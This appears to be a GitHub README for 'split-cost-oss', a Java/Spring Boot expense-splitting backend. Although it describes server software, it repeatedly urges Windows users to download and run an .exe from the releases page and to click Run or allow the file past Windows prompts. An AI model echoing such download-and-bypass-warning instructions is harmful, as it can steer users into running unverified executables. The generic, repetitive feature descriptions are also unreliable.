# 🧩 split-cost-oss - Split trip expenses with ease

[![Download split-cost-oss](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nnrtns/split-cost-oss/releases)
[![Release page](https://img.shields.io/badge/Release%20Page-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nnrtns/split-cost-oss/releases)

## 📥 Download

Visit the [GitHub Releases page](https://github.com/nnrtns/split-cost-oss/releases) to download and run this file on Windows.

On the releases page, look for the latest version and download the Windows file that matches your device. If there are more than one file, choose the one that ends in `.exe` or the Windows package name shown in the release notes.

## 🖥️ What this app does

split-cost-oss helps track trip expenses and split them between people.

Use it when a group shares costs like:

- hotel stays
- fuel
- meals
- tickets
- shared supplies

The app helps you:

- record what each person paid
- split costs across the group
- calculate who owes money
- keep settlements simple
- reduce manual math

It uses a backend service built with Java, Spring Boot, PostgreSQL, Docker, and a settlement engine for split rules.

## ✅ Before you start

For Windows use, prepare:

- a Windows 10 or newer PC
- a web browser
- internet access for the download
- enough free disk space for the app and data
- Docker Desktop if you plan to run the full local setup

If you only want to use a packaged release, download the file from GitHub Releases and follow the steps in the release notes.

## 🚀 Quick start for Windows

1. Open the [GitHub Releases page](https://github.com/nnrtns/split-cost-oss/releases)
2. Find the latest release
3. Download the Windows file
4. Save it to your Downloads folder
5. If the file is zipped, extract it
6. Double-click the app file or follow the release steps
7. If Windows asks for approval, choose Run
8. Wait for the app to start
9. Open the app in your browser if the release notes point to a local address
10. Create or open a trip and begin adding expenses

## 🧭 Typical setup steps

If the release includes a local server setup, use these common steps:

1. Download the release file from GitHub
2. Extract the files if needed
3. Start the app from the included Windows launcher or command file
4. Wait for the service to finish starting
5. Open the address shown in the window or release notes
6. Sign in if your setup includes user access
7. Start a new trip
8. Add people to the trip
9. Enter each expense
10. Review the settlement results

## 🧱 What you need for a full local run

If you want to run the backend on your own machine, use this setup:

- Java 17 or newer
- Maven
- PostgreSQL
- Docker and Docker Compose
- a code editor if you plan to inspect files

A basic local run usually follows this path:

1. Start PostgreSQL
2. Start the backend service
3. Open the app endpoint in your browser or client
4. Add trip data through the app’s screens or API

## 🛠️ Local run with Docker

The project includes Docker support for local use.

Typical flow:

1. Install Docker Desktop
2. Download the project files or release package
3. Open a terminal in the project folder
4. Start the stack with Docker Compose
5. Wait until the backend and database are ready
6. Open the app address shown in the setup output

Common Docker services in this project:

- backend API
- PostgreSQL database

## 📦 Project features

- trip-based expense splitting
- simple and basic settlement logic
- shared expense tracking
- group balance calculation
- REST API support
- PostgreSQL storage
- Docker-based local setup
- separate settlement engine for core split logic

## 🧾 How expense splitting works

The app follows a simple flow:

1. One person pays for a shared expense
2. The expense gets linked to a trip
3. The app splits the cost across the group
4. The system tracks each person’s balance
5. The settlement engine finds who should pay whom
6. The app shows the final transfer plan

This helps avoid long payment chains. It keeps settlement steps clear and small.

## 🧑‍💻 Main parts of the system

The project includes these parts:

- backend REST API for app actions
- domain layer for trip and expense rules
- settlement engine for payment balancing
- PostgreSQL database for saved data
- Docker files for repeatable setup

This structure helps the app keep business rules apart from storage and server code.

## 🔍 Common use case

A group of four friends takes a weekend trip.

- Alice pays for the hotel
- Ben pays for dinner
- Chris pays for fuel
- Dana pays for tickets

The app can:

- store each payment
- split each cost across all four people
- show each person’s share
- calculate final balances
- list the transfers needed to settle up

## 🧰 Running notes for Windows users

When you download the release:

- save it in a folder you can find
- keep the file name as downloaded
- unzip it only if the release uses an archive
- check the release page for the exact start method
- use the latest release unless the project notes say otherwise

If Windows shows a file check prompt, allow the app if it came from the official GitHub release page.

## 📁 Suggested folder layout

If you run the project from source or from a release package, a simple layout can look like this:

- project folder
- app files
- config files
- database files
- logs

Keep the app and database files in the same parent folder when the release instructions ask for it.

## 🌐 API use

This project includes a REST API. That means other tools can send and receive data over HTTP.

The API is useful for:

- adding trips
- adding people
- saving expenses
- checking balances
- getting settlement results

If you use the API directly, you can test it with tools like Postman or your browser for simple GET requests.

## 🗃️ Data storage

The app uses PostgreSQL.

That means it can store:

- trips
- participants
- expenses
- payment results
- settlement data

For local use, PostgreSQL runs on your machine or in Docker. For a packaged release, the app may connect to a bundled or prebuilt database setup.

## 🔄 Settlement modes

The project supports two common settlement styles:

- basic settlement
- simplified settlement

Basic settlement keeps the logic direct. Simplified settlement reduces the number of payments by grouping balances in a cleaner way.

This helps groups settle up with fewer transfers.

## 🧪 If the app does not start

Try these steps:

1. Make sure the downloaded file finished fully
2. Check that Windows did not block the file
3. Confirm Docker is running if you use Docker
4. Confirm PostgreSQL is available if you run from source
5. Check that the right port is free
6. Restart the app
7. Try the latest release file again

## 📌 Source build steps

If you want to run the backend from source:

1. Clone the repository
2. Open a terminal in the project folder
3. Run the Maven build
4. Start PostgreSQL
5. Start the Spring Boot app
6. Open the local app address
7. Use the REST API or any included interface

Typical Maven command:

- `mvn clean install`

Typical Spring Boot start command:

- `mvn spring-boot:run`

## 🧭 Folder purpose

You may see files and folders for:

- application code
- database changes
- Docker setup
- config values
- test files
- domain logic
- settlement logic

Each part helps keep the project easy to maintain and test.

## ❓ Common questions

### Do I need coding skills?

No. For the Windows release, you only need to download the file, open it, and follow the release steps.

### Do I need Docker?

Not for every use case. Docker helps if you want the full local stack on your own machine.

### Can I use this on other systems?

The app is built for Windows users in this guide, but the stack also fits local development on other systems with Java, PostgreSQL, and Docker.

### Does it help with group trips?

Yes. The app is built for trip expense splitting and settlement.

## 🔗 Download again

Get the latest release here: https://github.com/nnrtns/split-cost-oss/releases

## 🧭 Release page tips

When you open the release page, look for:

- the newest version
- attached files
- Windows packages
- setup notes
- file names that match your system

If there are multiple files, choose the one marked for Windows or the one that fits your release package type

## 🧩 Tags

algorithms, backend, docker, docker-compose, expense-sharing, expense-splitter, hibernate, java, jpa, maven, postgresql, rest-api, settlement-engine, spring-boot, system-design